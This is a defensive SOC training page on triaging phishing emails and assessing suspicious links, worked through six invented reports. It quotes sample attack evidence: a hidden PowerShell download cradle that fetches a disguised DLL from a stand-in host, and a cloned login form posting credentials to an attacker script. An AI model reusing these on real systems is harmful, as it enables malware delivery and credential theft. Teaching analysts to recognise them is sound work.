---
title: "Email Attacks and Assessing Links — Attachments, Lookalikes, Hacked Sites, Trusted Hosts and Shortened URLs"
tags:
  - training
  - blue-team
  - soc
  - analysis
  - investigation
  - email
  - phishing
---

# Email Attacks and Assessing Links — Attachments, Lookalikes, Hacked Sites, Trusted Hosts and Shortened URLs { #email-links-phishing }

!!! abstract "What this page covers"
    The fourth investigation question — **what does the data tell me?** — applied to the evidence analysts see most: email. First, the four ways email is used to attack (a malicious attachment — executables, scripts, compressed and password-protected archives, macro-enabled documents; a malicious link; a pure scam with no payload at all; and the rare exploit in the mail client or operating system), and why the first thing you do with any of them is read the headers. Then the eight common tricks for getting a victim to click a bad link: link text that differs from the target, lookalike domains (including internationalised domain names), lookalike subdomains, cloned login pages, open redirects, "good" sites carrying bad content, hacked sites and shortened links. Then three of them in depth: how to tell a site that was **hacked** from one that was **built for evil** (shadowed subdomains, odd folders, compromised blog software, reputation and age, historical scan snapshots, and why you should put an expiry date on that block), why a download from a trusted cloud file-sharing service is still not proof of anything, and how to see where a **shortened link** goes without clicking it. A queue of six invented phishing reports from one morning is triaged throughout: header lines, HTML `href` values, punycode decoded with Python, a hacked WordPress path, an open redirect unwrapped, a `curl -sI` check read line by line and proxy and EDR evidence for a cloud-hosted payload. The 2026 view and practice questions close the page.

!!! note "Labels"
    **[Supplement]** = practical material you need to know, **[Correction]** = a commonly repeated claim that is wrong or outdated, **[Changed]**/**[Caution]** = what has changed recently and what is risky to do the old way. The company (Bluegum Freight, `bluegumfreight.example`), people, hostnames, domains, IPs, hashes, headers and log lines are invented for illustration (`.example`, documentation and private IPs). Tools, services and protocols are real and described in my own words.

## The 8 key points { #key-points }

1. **Email attacks come in four shapes.** A malicious attachment, a malicious link, a scam with no payload, and — rarely — an exploit in the mail client or operating system. Each shape leaves different evidence and is stopped by different controls.
2. **Read the headers first.** If the sender is spoofed, the message is almost certainly malicious, whatever it carries. A real person does not need to forge their own address.
3. **Attachments hide by being normal or by being unreadable.** Macro documents look like the documents people swap all day; compressed and password-protected archives cannot be opened by an email filter, but can be by the human who reads the password in the body.
4. **Links are harder to filter than files.** A link is just text until someone clicks, there is no blanket policy against it, and its destination can change after delivery. That is why links remain the attacker's favourite.
5. **Know the eight link tricks.** Text ≠ target, lookalike domains (including IDNs), lookalike subdomains, cloned login pages, open redirects, good site/bad content, hacked sites, shortened links. Most phishing uses one or two of them.
6. **A good domain can still serve a bad page.** Hacked sites and shadowed subdomains borrow a clean reputation. A long history and good rating plus a strange subdomain, folder or redirect suggests *hacked*, not *built for evil* — and that changes how long you block it.
7. **"It came from a trusted file-sharing site" proves nothing.** Attackers stage payloads on cloud storage so that hostname, port and certificate all look normal; the file itself and the endpoint are where you find out.
8. **Expand shortened links without visiting the destination.** Use the shortener's own preview feature or a header-only request from an analysis machine, then check the real destination like any other link.

## Why this matters in a SOC { #why }

Think of the front desk of an office building. Almost every visitor arrives through it, so it is the obvious place for a con artist to try their luck. Some carry a suspicious parcel (an attachment). Some hand over a business card with an address to visit later (a link). Some carry nothing at all and simply talk their way into getting someone to do them a favour (a scam). A good receptionist does not only X-ray the parcels; they look at the card, check the ID, and ask whether this visitor is who they claim to be.

Back to the technical reality. Phishing is still one of the most common ways in, and "user reported a suspicious email" is one of the most common tickets in any SOC queue. Most of those tickets are harmless — marketing, a real colleague, an unwanted newsletter — and a few are the start of an intrusion. The skill this page teaches is to decide quickly and correctly which is which: read the headers, classify the attack method, take the link apart without clicking it, and know which trick you are looking at. The next page then answers the questions that decide the response: was it targeted, did anyone click, did anyone type a password, and is this business email compromise?

## Email-based attack methods { #methods }

### 1. A malicious file attached directly { #attachments }

The most common method is still to attach something harmful. What changes is the wrapping, because each wrapping beats a different filter.

- **Executable and script formats.** `.exe`, `.scr`, `.js`, `.vbs`, `.hta`, `.ps1`, `.wsf`, `.bat`, `.lnk` and similar. Most organisations block executables at the gateway by policy, so attackers moved to scripts — formats that Windows will happily run but which are a little more "off the radar". The good news is that script extensions can usually be blocked by blanket policy too, because almost nobody needs to email them.
- **Compressed archives** (`.zip`, `.7z`, `.rar`, and container formats such as `.iso` and `.img`). A filter has to unpack an archive before it can inspect what is inside, which costs time and processing, and some appliances give up on deep or unusual nesting.
- **Password-protected archives.** The cleverest variation. The password has to be in the email body ("the password is 2026"), which a human reads easily but an automated filter struggles to find and use. The appliance cannot decrypt the archive, the message is allowed through, and the victim extracts the payload themselves.
- **Macro-enabled documents** (`.docm`, `.xlsm`, older `.doc`/`.xls`). These are hard to block by file type, because people genuinely need to send each other Office files. Telling a good spreadsheet from a weaponised one needs content inspection or sandboxing — more complex and more expensive technology.

**Worked example — the password in the body.** A report arrives with an attachment `Remittance_Nov.zip` and the line "Archive password: BG2611". From an isolated analysis machine:

```
7z l -pBG2611 Remittance_Nov.zip
```

- `7z` — the 7-Zip command-line tool.
- `l` — **list** the contents, without extracting anything.
- `-pBG2611` — supply the password (no space between `-p` and the password).
- `Remittance_Nov.zip` — the archive.

Output (shortened):

```
   Date      Time    Attr         Size   Compressed  Name
------------------- ----- ------------ ------------  ------------------------
2026-11-25 21:14:02 ....A       184320        61211  Remittance_Nov.pdf.js
------------------- ----- ------------ ------------  ------------------------
```

One file, `Remittance_Nov.pdf.js` — a JavaScript file wearing a PDF name. Windows hides known extensions by default, so the user would see `Remittance_Nov.pdf`. The gateway logged the archive as "encrypted, not scanned". Without opening anything, the analyst already knows the method (password-protected archive containing a script) and can block by sender, subject and attachment hash while the script is examined safely (see [Safe Handling and File Types](../file-analysis/safe-handling-file-types.md)). In ATT&CK terms: T1566.001 Phishing: Spearphishing Attachment, T1027.013 Obfuscated Files or Information: Encrypted/Encoded File, and T1204.002 User Execution: Malicious File if it is opened.

### 2. Malicious links { #links }

The eternal favourite. A link is easier to slip past automated checks than a file: it is just text, the page behind it can be harmless when the filter checks and harmful when the user clicks, and there is no simple policy that can drop every email containing a URL. The rest of this page is mostly about links.

### 3. Scams and social engineering { #scams }

Sometimes there is nothing to scan at all — no file, no link, only words. The sender pretends to be the CEO, a supplier or a lawyer, and asks someone to change bank details, buy gift cards or pay an "urgent" invoice. These are often the hardest to detect, precisely because content filters have nothing to grab onto. Business email compromise, covered on the next page, is the most expensive version.

### 4. Mail client or operating system exploits (rare) { #client-exploits }

Very occasionally a flaw in how the mail client or the operating system handles a file type turns an ordinary-looking file into an attack. An image or a calendar invite — things nobody considers dangerous — can then compromise a machine just by being previewed or opened. One well-known historical example was a Windows flaw in handling TIFF images, patched in 2013. These attacks are rare compared to the other three, but very dangerous while they work, because they weaponise file types that every policy allows. **[Supplement]** The defence is patching mail clients, preview handlers and the operating system quickly, and treating "zero-click" advisories for mail software as urgent.

### Read the headers! { #headers-first }

Whatever the method, start with the headers. **Spoofing nearly always indicates something malicious** — a legitimate sender has no reason to forge an address. Three lines answer most questions (the [email section](../email/index.md) explains each in depth):

```
Return-Path: <billing@invoicehub-mailer.example>
From: "Bluegum Freight Accounts" <accounts@bluegumfreight.example>
Authentication-Results: mx.bluegumfreight.example; spf=pass smtp.mailfrom=invoicehub-mailer.example; dkim=none; dmarc=fail action=quarantine header.from=bluegumfreight.example
```

- `Return-Path` — the envelope sender (`MAIL FROM`), where bounces go. Here it is an outside domain.
- `From` — what the user sees: our own accounts team. Display name and address both claim to be internal.
- `spf=pass smtp.mailfrom=invoicehub-mailer.example` — SPF passed, but **for the outside domain**, not for ours. A pass for the wrong domain proves nothing about who wrote the `From` line.
- `dkim=none` — no signature.
- `dmarc=fail … header.from=bluegumfreight.example` — the domain in `From` did not align with any passing check. Our own domain is being spoofed from outside. Treat the message as malicious unless proved otherwise.

## The morning's phishing reports { #worked-queue }

Six reports reached Bluegum Freight's phishing mailbox before 09:00. They are used throughout the page.

| # | Reported by | Subject | What is in it |
| --- | --- | --- | --- |
| E1 | a.nguyen (payroll) | "Your payslip is ready" | Button "View payslip" |
| E2 | r.osei (sales) | "Shared: Q4 rate card" | Link to a "document portal" |
| E3 | m.tran (IT) | "Mailbox storage full" | Link to a sign-in page |
| E4 | j.kelly (ops) | "Delivery exception #88412" | Link through a partner's website |
| E5 | s.patel (finance) | "Remittance advice" | Link to a cloud file-sharing site |
| E6 | l.ward (HR) | "Updated policy — please sign" | A shortened link |

## Assessing links: the eight common tricks { #assessing-links }

| Trick | What the victim sees | What is really happening | What to check |
| --- | --- | --- | --- |
| Text ≠ target | A trustworthy-looking link or button | The `href` points somewhere else | The raw HTML `href`, not the text |
| Lookalike domain | A domain that "looks right" | Swapped characters (`rn` for `m`, `1` for `l`) or Unicode lookalikes (IDNs) | Read the domain character by character; decode punycode |
| Lookalike subdomain | Our brand at the start of the hostname | Our brand is only a *subdomain* of the attacker's domain | Find the registered domain (read right to left) |
| Cloned login page | A perfect copy of a real sign-in page | A kit copied the page; the form posts to the attacker | The address-bar host and where the form posts |
| Open redirect | A link on a real, reputable site | A redirect feature forwards to any URL in a parameter | Look for `url=`, `redirect=`, `next=`, `dest=` and decode them |
| Good site, bad content | A big cloud file-sharing or document service | An attacker uploaded the payload to their own account and shared it | The file itself, endpoint telemetry, sandboxing |
| Hacked site | A real small business or blog with good reputation | The server or the domain's DNS was compromised | Odd subdomain or folder, CMS paths, recent changes |
| Shortened link | `short.example/Ab3x` | The real destination is hidden | Preview or expand it safely |

### Text differs from the link target — E1 { #text-vs-target }

One of the oldest tricks, and it still works because people do not always hover before they click. In the raw HTML of E1:

```
<a href="https://payslip-bluegum.example/view?id=88231" style="background:#1a5;color:#fff;padding:10px">View payslip on bluegumfreight.example</a>
```

- `<a href="…">` — the **target**: where the browser actually goes.
- `https://payslip-bluegum.example/…` — a different registered domain, `payslip-bluegum.example`, which merely contains our brand.
- The link **text** ("View payslip on bluegumfreight.example") is just words painted on a green button. It can say anything.

To pull every link out of a saved message quickly on the analysis machine:

```
grep -oiE 'href="[^"]+"' E1.eml | sort -u
```

- `grep -o` — print only the matching part, not the whole line; `-i` ignore case; `-E` extended regular expressions.
- `'href="[^"]+"'` — the text `href="`, then one or more characters that are not a quote, then the closing quote.
- `E1.eml` — the message saved from the reporting mailbox (forwarded as an attachment so the headers are kept).
- `sort -u` — sort and keep one copy of each.

Output:

```
href="https://payslip-bluegum.example/view?id=88231"
href="https://www.bluegumfreight.example/privacy"
```

The attacker included one genuine link (the privacy policy) to make the message look normal — a common touch. **[Supplement]** If the body is quoted-printable encoded, you may see `href=3D"…"` and lines broken with `=` at the end; decode the MIME part first (your mail tool's "view source" or a Python `email` parser) so links are not split.

### Lookalike domains and IDNs — E2 { #lookalike-domains }

E2's link text and target *match* — and it is still a trap:

```
<a href="https://docs.bluegum-frеight.example/rate-card">https://docs.bluegum-frеight.example/rate-card</a>
```

It reads as "bluegum-freight". But the second `е` in "freight" is the Cyrillic letter U+0435, which looks identical to the Latin `e`. Domains containing non-ASCII characters are **internationalised domain names (IDNs)**, and DNS carries them in an ASCII form called **punycode**, which starts with `xn--`. Decode it on the analysis machine:

```
python3 -c "print('docs.bluegum-frеight.example'.encode('idna'))"
```

- `python3 -c "…"` — run one line of Python.
- `'…'.encode('idna')` — convert the hostname to the ASCII form DNS actually uses.

Output:

```
b'docs.xn--bluegum-fright-9vl.example'
```

- `xn--` — the marker for a punycode label.
- `bluegum-fright` — the ASCII letters that were in the label, with the non-ASCII one removed (note: no second `e`).
- `-9vl` — the encoded instructions for where to re-insert the missing Cyrillic character.

The reverse also works: `python3 -c "print(b'xn--bluegum-fright-9vl'.decode('idna'))"` prints the Unicode form. Simpler lookalikes need no Unicode at all: `bluegumfrieght.example` (swapped letters), `b1uegumfreight.example` (one for l), `bluegumfreight-online.example` (an extra word), `rn` that looks like `m`. Read the domain slowly, letter by letter, and compare it with the real one. In ATT&CK terms, registering such a domain is T1583.001 Acquire Infrastructure: Domains.

### Lookalike subdomains — E3 { #lookalike-subdomains }

E3's sign-in link:

```
https://login.bluegumfreight.example.mailbox-quota.example/owa/auth.html
```

This preys on people who do not know how domain names work. A hostname is read **from right to left**: the top-level domain (`.example`), then the registered domain (`mailbox-quota.example`), then any subdomains the owner chose to add. Everything to the left of `mailbox-quota.example` — `login.bluegumfreight.example.` — is a subdomain the attacker created in their own zone. It contains our name, but our organisation does not own it. **[Supplement]** Some reporting tools and browsers highlight the registered domain; when you write up the ticket, always record it separately ("registered domain: `mailbox-quota.example`") because that is what you will block and look up.

### Cloned login pages — E3 continued { #cloned-pages }

E3's page is a pixel-perfect copy of Bluegum's webmail sign-in. When the goal is to collect usernames and passwords, attackers use tools that copy a page and host it in minutes — social-engineering toolkits make cloning a wizard-driven job. The page is not where the evidence is; the evidence is **where it lives and where its form sends data**:

```
<form method="POST" action="https://mailbox-quota.example/owa/post.php">
  <input type="email" name="u">
  <input type="password" name="p">
```

- `method="POST"` — the browser will send the typed values in the request body.
- `action="…/post.php"` — the values go to a PHP script on the attacker's server, not to Bluegum's webmail.
- `name="u"` / `name="p"` — the parameter names the stolen username and password will carry. These are useful search terms in decrypted proxy logs (next page).

The next page shows how to tell whether anyone actually submitted the form. ATT&CK: T1566.002 Phishing: Spearphishing Link for the delivery and T1598.003 Phishing for Information: Spearphishing Link for credential collection.

### Open redirects — E4 { #open-redirects }

E4's link starts at a real, well-known partner:

```
https://track.partner-logistics.example/r?dest=https%3A%2F%2Fdelivery-fix.example%2Fpay
```

- `track.partner-logistics.example` — a genuine tracking site with good reputation; filters and users trust it.
- `/r?dest=` — a redirect feature: the site sends whoever visits to whatever URL is in `dest`. If the site does not check that destination, anyone can use it to bounce victims elsewhere. That is an **open redirect**, and it acts like a link shortener with someone else's good name on it.
- `https%3A%2F%2Fdelivery-fix.example%2Fpay` — URL encoding: `%3A` is `:`, `%2F` is `/`.

Decode it without visiting:

```
python3 -c "import urllib.parse as u; print(u.unquote('https%3A%2F%2Fdelivery-fix.example%2Fpay'))"
```

Output: `https://delivery-fix.example/pay` — the real destination, a domain registered three days ago. Analyse and block *that*, not the partner. **[Supplement]** Look for parameters such as `url=`, `u=`, `redirect=`, `next=`, `goto=`, `dest=`, `continue=`, and remember that some redirects are nested (a redirect to a redirect) or Base64-encoded. Also recognise your own mail security's rewriting, such as Microsoft Defender Safe Links (`safelinks.protection.outlook.com/?url=…`) — the real URL is in the parameter. Abusing a trusted site like this is covered in ATT&CK under T1608.005 Stage Capabilities: Link Target.

## A link to a hacked site { #hacked-sites }

Sometimes the domain looks fine because it *is* fine — or was, until someone broke in. Attackers like to borrow the good name a site has already built. When a new exploit for popular website software (WordPress, Joomla, Drupal and their plugins) is published, attackers start scanning the internet for vulnerable servers almost immediately, and turn the ones they compromise into hosting for phishing pages and malware. So you will see alerts for downloads or exploit attempts from sites that have a *good* reputation.

There is a second route: if an attacker phishes the domain's administrator and gets into their DNS registrar or hosting account, they can add extra subdomain records pointing at their own server. The parent domain keeps its clean history while `invoice.realbusiness.example` serves malware. This is **domain shadowing** (ATT&CK T1584.001 Compromise Infrastructure: Domains; a hacked web server is T1584.004 Compromise Infrastructure: Server).

**Signs a normally good site might have been hacked:**

- An **odd subdomain** of a good parent domain (shadowing).
- A **suspicious folder** under an otherwise normal domain.
- Paths of **commonly compromised blog or CMS software** — `/wp-content/`, `/wp-includes/`, `/components/`, `/sites/default/files/`.

### Worked example: hacked or built for evil? { #hacked-example }

Suppose the proxy shows a user from another team opened this link yesterday (it came from a different phishing wave):

```
https://www.harbourbakery.example/wp-content/uploads/2026/11/docs/secure/index.php?e=a.nguyen@bluegumfreight.example
```

- `www.harbourbakery.example` — a small local bakery. The domain was registered in 2011, has clean reputation everywhere and has served the same simple site for years.
- `/wp-content/uploads/2026/11/` — WordPress's normal media folder for November 2026. Images belong here; PHP scripts do not.
- `docs/secure/index.php` — a phishing kit unpacked into the uploads folder. Folder names like `docs`, `secure`, `office`, `verify` under uploads are classic.
- `?e=a.nguyen@…` — the victim's address passed in the URL so the kit can pre-fill the login box. Personal touches like this mean the link was generated per recipient.

Clues that point to **hacked** rather than **built for evil**:

- A sound reputation history — sites that were evil from the start rarely have good ratings in reputation engines and URL scanners.
- An old creation date for the domain.
- Running out-of-date software that is known to be exploitable.
- An active malicious redirect or a freshly placed file: the HTTP response's `Last-Modified` header (or the file's timestamp in a directory listing) for the kit file may be from last week while the rest of the site is years old.

Clues that point to **built for evil**: registered days ago, a name that mimics a brand, no history, cheap or privacy-masked registration, nothing else hosted there.

**If the site has been cleaned up before you look.** It happens: a user visited while the site was infected, and by the time you investigate the owner has removed the kit. If you have no packet capture or detailed proxy logs, public URL scanning services (such as urlscan.io) may hold **historical snapshots** from when someone scanned it in its infected state — screenshots, the DOM, redirects and requested resources. Those tell you what the page would have done and where it would have sent the user, so you can check whether your user's traffic matches.

**Blocking a hacked site.** A site built for evil can be blocked forever. A hacked site is a victim; once cleaned, people may legitimately need it again. Blocking an unknown small site for good is usually fine, but when a big-name site gets infected you will need to block it *for now*. Put an **expiry date** on the block if your tools allow it, or a reminder in the ticket to revisit it. **[Supplement]** Block as narrowly as you can — the exact path or subdomain rather than the whole domain — and consider telling the owner (or their hosting provider) so they can clean up; the next section covers how to do that without exposing your investigation.

## A link to a "safe" site hosting a bad download — E5 { #trusted-hosting }

A download from a big cloud file-sharing service does not mean it is good. The pattern is simple:

1. **Stage the malware.** The attacker uploads a macro document, script or executable to a folder in an account they own — or in a *compromised* account at another company — and shares it publicly so anyone with the link can download it (T1608.001 Stage Capabilities: Upload Malware).
2. **Send the phishing link.** The usual lure, pointing to the trusted service.
3. **The user downloads it.**

Attackers like this for two reasons. You are far less suspicious of traffic to well-known file-sharing services, and those services are TLS-encrypted, free and easy, so the attacker's set-up cost is close to zero. Hostname checks pass, the certificate is valid, and unless your organisation decrypts TLS, the network sees only "user connected to a popular file-sharing service". You are left to catch the file another way: endpoint controls (EDR, antivirus, process monitoring), or sandboxing appliances that detonate downloads started from email clicks.

E5's link: `https://share.cloudfiles.example/s/q8Hk2/Remittance-2611.zip`. Bluegum decrypts traffic to file-sharing services, so the proxy shows:

```
2026-11-27T07:42:18Z  src=10.20.6.41  user=BLUEGUM\s.patel  method=GET  host=share.cloudfiles.example  url=/s/q8Hk2/Remittance-2611.zip  status=200  ctype=application/zip  bytes_in=48211  category=File Sharing  action=allowed
```

- `user=BLUEGUM\s.patel` — the person who reported the email clicked it first. That is common; people report after something feels wrong.
- `host=share.cloudfiles.example`, `category=File Sharing`, `action=allowed` — every reputation and category check passed.
- `ctype=application/zip`, `bytes_in=48211` — a 47 KB archive arrived. Small, as script loaders usually are.

Network data stops here: it proves a download happened, not whether the file is bad. The endpoint answers the rest. EDR on BG-WS-0641 shows:

```
07:42:55  explorer.exe → wscript.exe  "C:\Users\s.patel\Downloads\Remittance-2611\Remittance-2611.js"
07:42:56  wscript.exe → powershell.exe  -nop -w hidden -ep bypass -c "iwr https://cdn-sync.example/u.png -OutFile $env:TEMP\u.dll"
```

- `explorer.exe → wscript.exe … .js` — the user double-clicked a JavaScript file extracted from the archive; Windows Script Host ran it (T1204.002, T1059.007 JavaScript).
- `wscript.exe → powershell.exe` — a script host starting PowerShell is rarely legitimate.
- `-nop -w hidden -ep bypass` — no profile, hidden window, ignore execution policy.
- `iwr … u.png -OutFile … u.dll` — `Invoke-WebRequest` downloads a "PNG" and saves it as a DLL (T1105 Ingress Tool Transfer).

On Windows, the matching host log is **Security event 4688** (a new process was created): it fires every time a process starts, if process-creation auditing is on, and with command-line logging enabled it records the full `powershell.exe` command above. Attackers care because it is exactly the record that exposes their download cradle — which is why they try to run without new processes, or clear logs. If **PowerShell Script Block Logging** is on, **event 4104** in the PowerShell Operational log records the script text itself. Now it is an incident: isolate the host, block `cdn-sync.example`, and report the shared file to the file-sharing provider (see [Phishing Delivery & Initial Execution](../../../adversary/phishing-delivery.md)).

## What's that shortened link hiding? — E6 { #shortened-links }

E6 contains `https://lnk.example/Pq7Rz`. Attackers use shorteners to hide where a link really goes, and to swap the destination after delivery. The analyst's job is to uncover the true URL **without visiting the destination**.

**Option 1: the shortener's own preview.** Many shorteners have a built-in way to show the destination instead of going there:

| Shortener | Preview method | Notes |
| --- | --- | --- |
| Bitly (`bit.ly`) | Add `+` to the end: `bit.ly/<code>+` | Still shows the destination; public click counts are no longer shown |
| TinyURL | Add `preview.` as a subdomain: `preview.tinyurl.com/<code>` | |
| is.gd | Add `-` to the end | Has been documented for years; confirm before relying on it |
| tiny.cc | Add `~` to the end | As above |

Shorteners change these features over time, so test the method on a link you created yourself before relying on it in an investigation.

**Option 2: an expansion service.** Third-party "unshorten" services follow the redirects for you, and some also take a screenshot of the destination. Convenient, but they are outside parties: they see the link, and some publish what was looked up (see the [Caution](#trends) box).

**Option 3: a header-only request from an analysis machine.** Ask the shortener where it would send you, without following:

```
curl -sI https://lnk.example/Pq7Rz
```

- `curl` — command-line HTTP client.
- `-s` — silent (no progress bar).
- `-I` — send a `HEAD` request and print only the response headers.
- No `-L` — so curl **does not follow** the redirect. You talk only to the shortener, never to the destination.

Output:

```
HTTP/2 301
date: Fri, 27 Nov 2026 08:05:12 GMT
location: https://hr-docs-sign.example/policy/view?uid=l.ward
content-length: 0
```

- `HTTP/2 301` — "moved permanently": a redirect.
- `location:` — **the answer**. The real destination is `hr-docs-sign.example`, and the path carries the recipient's own username — another per-recipient link.
- `content-length: 0` — no page body; the shortener only redirects.

Now check `hr-docs-sign.example` like any other link: age, reputation, hosting, what it serves (with a sandboxed browser or a scanning service set to private). **[Caution]** Even a header request touches the shortener, and some phishing infrastructure logs visits by IP or blocks repeat visitors. Do it from an analysis environment that cannot be traced to your organisation; the Analysis OPSEC section that follows this one covers how.

## The morning's queue, triaged { #queue-result }

| # | Method | Trick(s) | Key evidence | Verdict and next step |
| --- | --- | --- | --- | --- |
| E1 | Link | Text ≠ target, brand inside another domain | `href` to `payslip-bluegum.example` | Malicious. Block domain, search proxy for clicks |
| E2 | Link | IDN lookalike | Punycode `xn--bluegum-fright-9vl` | Malicious, likely targeted (brand-specific domain). Escalate |
| E3 | Link | Lookalike subdomain + cloned login | Registered domain `mailbox-quota.example`, form posts to `post.php` | Credential phishing. Check for form submissions |
| E4 | Link | Open redirect | `dest=` decodes to a 3-day-old domain | Malicious. Block the destination, not the partner; tell the partner |
| E5 | Link → file | Good site, bad content | Proxy download + EDR `wscript` → `powershell` | **Incident.** Isolate BG-WS-0641 |
| E6 | Link | Shortened link | `location:` to `hr-docs-sign.example`, username in path | Malicious, per-recipient. Check for clicks |

Notice that the headers came first for every one (E1 and E3 failed DMARC for our own domain; E2 came from a fresh lookalike domain with valid SPF and DKIM for *that* domain), and that the network alone could not finish E5.

## The 2026 view { #trends }

!!! success "[2026 Current] Still valid"
    All four email attack methods are still in use, and links remain the most common phishing payload. Reading headers first, decoding `href`s and punycode, finding the registered domain, unwrapping redirects, judging "hacked vs built for evil", setting expiry dates on blocks of victim sites and expanding short links without visiting the destination are all standard practice. Abuse of trusted cloud services is, if anything, more common than when these techniques were first written up.

!!! info "[Changed] What has changed"
    - **Macros are no longer the main attachment.** Since 2022 Office blocks macros in files from the internet by default, so attackers moved to containers (ISO, IMG), shortcut files (LNK), HTML smuggling, OneNote and PDF lures, and then away from attachments altogether — towards links, **QR codes** in images or PDFs (which pull the victim onto an unmanaged phone) and "ClickFix" pages that persuade the user to paste a command into the Run box (ATT&CK added T1204.004 User Execution: Malicious Copy and Paste).
    - **Cloned pages became live proxies.** Adversary-in-the-middle phishing kits relay the genuine sign-in page and steal the session cookie after MFA (T1557 Adversary-in-the-Middle, T1539 Steal Web Session Cookie). The page is "perfect" because it *is* the real page, passed through — so the host in the address bar matters more than ever.
    - **AI-written phishing.** Generative AI removed the spelling mistakes and clumsy grammar that used to be easy tells, and makes it cheap to tailor lures per person and per language. Judge by headers, domains, infrastructure and behaviour, not by writing quality.
    - **Shorteners changed.** Bitly no longer shows click counts publicly (only to the link owner); free Bitly links can show a preview page that may include advertising. Google turned off its goo.gl shortener in August 2025 (Google later said links still in active use would keep working). Attackers also shorten through trusted platforms' own redirectors instead of public shorteners.
    - **Email authentication is enforced more widely.** Large mailbox providers now require SPF, DKIM and DMARC from bulk senders, so crude spoofing of a protected domain is blocked more often, and attackers lean on lookalike domains, compromised real accounts and messages sent through legitimate SaaS platforms that pass authentication.
    - **Mail-client "zero-click" bugs** remain rare but do appear — for example in how clients handle reminders, calendar items or previews — so treat such advisories as urgent patches.
    - **ATT&CK IDs** used on this page: T1566.001, T1566.002, T1598.003, T1027.013, T1204.002, T1204.004, T1059.007, T1105, T1583.001, T1584.001, T1584.004, T1608.001, T1608.005, T1557, T1539. Tactic placement for some evasion techniques changed in ATT&CK v19 (April 2026); the IDs above were unchanged.

!!! warning "[Caution] Wrong or risky to do the old way"
    - **Don't click to "see what happens"** — not even on your own workstation "just to check". Use previews, header-only requests, private sandbox scans or an isolated analysis machine.
    - **Public scanning services publish by default in some cases.** urlscan.io, for example, offers public, unlisted and private scan visibility; a public scan of a per-recipient URL (like E1's `?id=` or E3's pre-filled address) can leak your employee's email address and tip off the attacker that you are looking. Strip personal parameters and choose private scans.
    - **"Valid certificate" and "good reputation" are not verdicts.** Free certificates are on most phishing sites, and hacked or trusted sites carry good reputation by definition.
    - **Don't block a trusted service's whole domain** because one shared file was malicious; block the specific link and report it to the provider.
    - **A clean scan today doesn't clear yesterday's click.** Phishing pages are switched off, cleaned or geofenced; use historical snapshots and your own logs from the time of the click.

## Practice questions { #quiz }

### Question 1

A user reports an email with a password-protected `.zip` attachment, the password written in the body. The gateway log says "encrypted archive — not scanned — delivered". Explain why attackers use this method, what you can safely do to see what is inside without running it, and what the file name `Statement.pdf.js` would tell you.

??? success "Answer and explanation"
    The filter can't inspect what it can't decrypt, and finding and using a password written in free text is hard to automate — so the appliance gives up and delivers, while a human reads the password and extracts the payload. It beats both file-type blocking (the outer file is just a zip) and content scanning.

    On an isolated analysis machine, **list** the contents without extracting: `7z l -p<password> archive.zip` shows names, sizes and dates. You can then extract into a safe folder and hash or inspect the files statically, without double-clicking them.

    `Statement.pdf.js` is a **JavaScript file** disguised with a double extension. Windows hides known extensions by default, so the user would see `Statement.pdf`, and double-clicking would run it in Windows Script Host. That is a script dropper (T1566.001 delivery, T1204.002 execution if opened, T1059.007 JavaScript), not a document.

### Question 2

Classify each link by trick and give the domain you would actually block: (a) `https://secure.bluegumfreight.example.account-check.example/login`, (b) `https://www.big-search.example/url?q=https%3A%2F%2Fpay-update.example%2F`, (c) `https://xn--bluegumfreght-dil.example/`, (d) `https://www.oldhardware.example/wp-content/uploads/2026/10/inv/view.php`.

??? success "Answer and explanation"
    (a) **Lookalike subdomain.** Read right to left: the registered domain is `account-check.example`; everything before it is the attacker's subdomain. Block `account-check.example`.

    (b) **Open redirect** on a reputable site. Decoding `%3A%2F%2F` gives `https://pay-update.example/`. Block `pay-update.example`, not the search site.

    (c) **IDN lookalike.** The `xn--` prefix means punycode; decoding it would show a Unicode name made to look like `bluegumfreight`. Block that exact punycode domain (and look for siblings registered at the same time).

    (d) **Hacked site.** A long-lived small business domain with a PHP file in WordPress's uploads folder. Block the **specific path** (or the domain with an expiry date), record the time, and consider notifying the owner — it is a victim, not attacker infrastructure.

### Question 3

A colleague expanded a shortened link by pasting it into a free "unshorten and screenshot" website, then said "the screenshot shows a normal page, so it's fine". List two problems with this approach and describe a safer method, including what you would read in the output.

??? success "Answer and explanation"
    Problems: (1) the outside service now holds the link, and some publish their lookups — if the link is per-recipient it can expose the employee and warn the attacker that the SOC is investigating; (2) the screenshot shows what *that service* was served from *its* location at *that* moment — phishing pages often geofence, filter by IP or user agent, or are switched on only for a short time, so "normal now" does not mean "normal when the user clicked". The screenshot also says nothing about what a form would do.

    Safer: use the shortener's own preview (for example `+` on Bitly, `preview.` on TinyURL), or from an unattributed analysis machine run `curl -sI <short-link>` **without** `-L`. Read the status line (`301`/`302` = redirect) and the **`location:`** header, which is the real destination. Then check that destination's age, reputation and hosting, and search your own proxy logs for both the short and the expanded URL to see whether anyone clicked (next page).

## Related { #related }

- [Analysing Network Events Layer by Layer](analysing-network-events.md) — previous page: the layer check-list that E5 needed
- [Investigation Questions](index.md) — section overview
- [Reading Email Headers](../email/email-headers.md) · [Email Spoofing and SPF](../email/spoofing-spf.md) · [DMARC and the Email Wrap-up](../email/dmarc-summary.md)
- [Domain Signals](../dns/domain-signals.md) · [Blockchain DNS and IDNs](../dns/blockchain-dns-and-idn.md)
- [Judging Requests](../http/reading-requests.md) — domain shadowing and URLs hidden in other URLs
- [Screenshots and Sandboxes](../http-analysis/screenshots-sandboxes.md) · [Malicious HTTP and Reputation](../http-analysis/evil-http-and-reputation.md)
- [Safe Handling and File Types](../file-analysis/safe-handling-file-types.md) · [Process Creation](../important-events/process-creation.md)
- [Phishing Delivery & Initial Execution](../../../adversary/phishing-delivery.md)
